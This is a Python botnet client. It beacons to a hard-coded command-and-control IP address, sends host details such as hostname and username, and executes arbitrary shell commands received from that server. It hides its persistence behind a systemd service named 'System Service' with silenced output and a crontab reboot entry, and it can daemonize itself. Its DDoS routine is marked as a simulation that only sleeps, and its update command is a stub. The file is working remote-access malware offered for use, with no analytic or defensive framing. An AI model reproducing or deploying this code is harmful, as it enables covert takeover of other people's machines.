#!/usr/bin/env python3
import socket
import subprocess
import os
import platform
import time
import random
import threading
import sys
import uuid
import base64

# Configuration
C2_SERVER = "89.213.44.48"  # Your server IP
C2_PORT = 8080  # Your bot server port
RECONNECT_DELAY = 30  # Seconds to wait before reconnecting

# Generate a unique bot ID
BOT_ID = str(uuid.uuid4())[:8]

def get_system_info():
    """Collect basic system information"""
    try:
        # Get CPU info
        with open('/proc/cpuinfo', 'r') as f:
            cpu_info = [line for line in f if 'model name' in line]
            cpu = cpu_info[0].split(':')[1].strip() if cpu_info else "Unknown CPU"
        
        # Get memory info
        with open('/proc/meminfo', 'r') as f:
            mem_info = [line for line in f if 'MemTotal' in line]
            memory = mem_info[0].split(':')[1].strip() if mem_info else "Unknown Memory"
        
        # Get distribution info
        try:
            with open('/etc/os-release', 'r') as f:
                os_info = dict(line.strip().replace('"', '').split('=', 1) for line in f if '=' in line)
                os_name = os_info.get('PRETTY_NAME', platform.system())
        except:
            os_name = platform.system()
        
        info = {
            "os": os_name,
            "hostname": platform.node(),
            "username": os.getlogin() if hasattr(os, 'getlogin') else subprocess.getoutput('whoami'),
            "cpu": cpu,
            "memory": memory,
            "arch": platform.machine(),
            "kernel": platform.release(),
            "bot_id": BOT_ID
        }
    except Exception as e:
        info = {
            "os": platform.system(),
            "hostname": platform.node(),
            "error": str(e),
            "bot_id": BOT_ID
        }
    return info

def execute_command(command):
    """Execute a shell command and return the output"""
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                  stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        
        output, error = process.communicate(timeout=30)
        if error:
            return f"Error: {error.decode('utf-8', errors='ignore')}"
        return output.decode('utf-8', errors='ignore')
    except Exception as e:
        return f"Execution error: {str(e)}"

def handle_ddos(target, port, duration):
    """Simulate a DDoS attack"""
    try:
        duration = int(duration)
        port = int(port)
        
        # This is a simulation - no actual attack is performed
        print(f"[*] Starting simulated attack on {target}:{port} for {duration} seconds")
        time.sleep(duration)
        print(f"[*] Attack on {target}:{port} completed")
        return "Attack completed"
    except Exception as e:
        return f"Attack error: {str(e)}"

def add_to_startup():
    """Add the bot to system startup (Linux)"""
    try:
        # Get the path to the current script
        script_path = os.path.abspath(__file__)
        
        # Create a systemd service file
        service_content = f"""[Unit]
Description=System Service
After=network.target

[Service]
ExecStart=/usr/bin/python3 {script_path}
Restart=always
RestartSec=5
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
"""
        # Write service file
        service_path = "/tmp/system-service.service"
        with open(service_path, 'w') as f:
            f.write(service_content)
        
        # Install the service
        os.system(f"sudo mv {service_path} /etc/systemd/system/")
        os.system("sudo systemctl daemon-reload")
        os.system("sudo systemctl enable system-service")
        os.system("sudo systemctl start system-service")
        
        # Alternative: Add to crontab
        os.system(f"(crontab -l 2>/dev/null; echo '@reboot /usr/bin/python3 {script_path}') | crontab -")
        
        return True
    except Exception as e:
        print(f"[-] Failed to add to startup: {str(e)}")
        return False

def connect_to_cnc():
    """Connect to the C&C server and handle commands"""
    while True:
        sock = None
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((C2_SERVER, C2_PORT))
            sock.settimeout(None)
            
            # Send system info on connection
            sys_info = get_system_info()
            sock.send(f"BOT_CONNECT|{BOT_ID}|{sys_info}".encode())
            
            print(f"[+] Connected to C&C server at {C2_SERVER}:{C2_PORT}")
            
            # Command handling loop
            while True:
                try:
                    # Receive command from server
                    data = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                    if not data:
                        continue
                    
                    print(f"[*] Received command: {data}")
                    
                    # Parse command
                    cmd_parts = data.split('|')
                    command_type = cmd_parts[0]
                    
                    # Handle different command types
                    if command_type == "SHELL":
                        # Execute shell command
                        cmd = cmd_parts[1]
                        output = execute_command(cmd)
                        sock.send(f"RESULT|{BOT_ID}|{output}".encode())
                    
                    elif command_type == "DDOS":
                        # Handle DDoS command
                        target = cmd_parts[1]
                        port = cmd_parts[2]
                        duration = cmd_parts[3]
                        
                        # Start DDoS in a separate thread
                        threading.Thread(target=handle_ddos, 
                                        args=(target, port, duration)).start()
                        sock.send(f"RESULT|{BOT_ID}|Attack started on {target}:{port}".encode())
                    
                    elif command_type == "UPDATE":
                        # Handle update command (download and execute new code)
                        update_url = cmd_parts[1]
                        sock.send(f"RESULT|{BOT_ID}|Update initiated from {update_url}".encode())
                        # Implement update logic here
                    
                    elif command_type == "PING":
                        # Simple ping to check if bot is alive
                        sock.send(f"PONG|{BOT_ID}".encode())
                    
                    elif command_type == "EXIT":
                        # Exit command
                        sock.send(f"RESULT|{BOT_ID}|Bot shutting down".encode())
                        sock.close()
                        sys.exit(0)
                    
                except Exception as e:
                    print(f"[-] Error handling command: {str(e)}")
                    break
        
        except Exception as e:
            print(f"[-] Connection error: {str(e)}")
        
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
        
        print(f"[*] Reconnecting in {RECONNECT_DELAY} seconds...")
        time.sleep(RECONNECT_DELAY)

def daemonize():
    """Run as a daemon process"""
    try:
        # Fork the process
        pid = os.fork()
        if pid > 0:
            # Exit the parent process
            sys.exit(0)
    except OSError:
        # If fork fails, continue anyway
        pass
    
    # Change working directory
    os.chdir('/')
    
    # Detach from terminal
    os.setsid()
    
    # Set file creation mask
    os.umask(0)
    
    # Fork again
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        pass
    
    # Close all file descriptors
    for fd in range(0, 1024):
        try:
            os.close(fd)
        except OSError:
            pass
    
    # Redirect standard file descriptors
    sys.stdout.flush()
    sys.stderr.flush()
    
    with open('/dev/null', 'r') as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    with open('/dev/null', 'w') as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
        os.dup2(f.fileno(), sys.stderr.fileno())

def start_bot():
    """Start the bot with persistence"""
    # Try to add to startup
    add_to_startup()
    
    # Start connection to C&C
    connect_to_cnc()

if __name__ == "__main__":
    # Check if we should run as daemon
    if len(sys.argv) > 1 and sys.argv[1] == '--daemon':
        daemonize()
    
    # Start the bot
    start_bot()